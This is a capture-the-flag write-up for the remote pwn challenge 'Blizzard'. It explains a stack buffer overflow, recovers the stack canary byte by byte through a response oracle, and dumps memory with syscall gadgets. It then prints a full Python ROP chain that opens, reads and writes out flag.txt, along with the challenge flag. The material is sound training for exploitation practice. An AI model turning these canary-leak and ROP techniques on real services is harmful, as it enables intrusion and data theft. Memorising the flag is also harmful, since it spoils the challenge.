---
title: "Blizzard"
description: "Two-byte big-endian length followed by that many payload bytes:"
event: "cryovault"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CryoVault Finals 2026","pwn"]
date: "2026-10-26"
teammate: false
source: "cryovault/pwn/blizzard/writeup.md"
---

**Category:** Pwn (blind / remote only)
**Target:** `nc 0.cloud.chals.io 29569`
**Flag:** `isfcr{bl1nd_sysc4ll_r0p_0p3n_r34d_wr1t3_bl1zz4rd_7f3c}`

## Protocol and bug

Two-byte big-endian length followed by that many payload bytes:

```
[ u16 length ][ payload ]
```

Normal response:

```
relayed <length>.
relay> 
```

The payload is copied into an 88-byte stack buffer with no bounds check.
The stack layout is:

| Offset | Contents |
|---:|---|
| 0–87 | frame buffer |
| 88–95 | stack canary |
| 96–111 | padding |
| 112–115 | live client fd (`4`) |
| 116–135 | padding |
| 136–143 | saved return address |

The canary is stable across forked connections but rotates when the service
restarts. It is recovered byte-by-byte with the `relayed N.` response as the
oracle.

## Gadgets and leak

After the first address scan found only the deliberate `d3c0y` decoys, an
arbitrary-read primitive was built from the binary's syscall gadgets:

```
0x400570  pop rdi ; ret
0x400572  pop rsi ; ret
0x400574  pop rdx ; ret
0x400576  pop rax ; ret
0x400578  syscall ; ret
```

The sequence `pop rax; 1` (write), `pop rdi; 4`, `pop rsi; addr`,
`pop rdx; len`, `syscall` dumps memory to the client socket. This was used to
dump `0x400000..0x404000`, revealing:

```
0x4016d8  "flag.txt"
```

No libc leak is needed because the binary contains a full syscall gadget set.

## Final exploit

The child process closes the listening socket, so after the `open` syscall the
`flag.txt` descriptor is **3**. A direct syscall ROP chain does:

```
open("flag.txt", O_RDONLY)      # syscall 2
read(3, 0x403100, 0x100)        # syscall 0
write(4, 0x403100, 0x100)       # syscall 1
```

Chain:

```python
prefix = b"A"*88 + canary + b"\0"*16 + p32(4) + b"\0"*20
payload  = prefix
payload += p64(0x400576) + p64(2)          # rax = open
payload += p64(0x400570) + p64(0x4016d8)   # rdi = "flag.txt"
payload += p64(0x400572) + p64(0)          # rsi = O_RDONLY
payload += p64(0x400574) + p64(0)          # rdx = 0
payload += p64(0x400578)                   # syscall
payload += p64(0x400576) + p64(0)          # rax = read
payload += p64(0x400570) + p64(3)          # rdi = fd 3
payload += p64(0x400572) + p64(0x403100)   # rsi = buffer
payload += p64(0x400574) + p64(0x100)      # rdx = 0x100
payload += p64(0x400578)                   # syscall
payload += p64(0x400576) + p64(1)          # rax = write
payload += p64(0x400570) + p64(4)          # rdi = client fd
payload += p64(0x400572) + p64(0x403100)   # rsi = buffer
payload += p64(0x400574) + p64(0x100)      # rdx = 0x100
payload += p64(0x400578)                   # syscall
```

Run `python3 solve.py`. Output:

```
isfcr{bl1nd_sysc4ll_r0p_0p3n_r34d_wr1t3_bl1zz4rd_7f3c}
```

## Notes

- The `d3c0y` strings are deliberate traps; the real flag is in `flag.txt`
  and read at runtime.
- The canary changes if the service restarts. Recover it with the framed
  oracle (first byte `\x00`, then bytes 1–7).
- Full leaked binary: `/tmp/opencode/blizzard_dump_full.bin` (may be wiped).
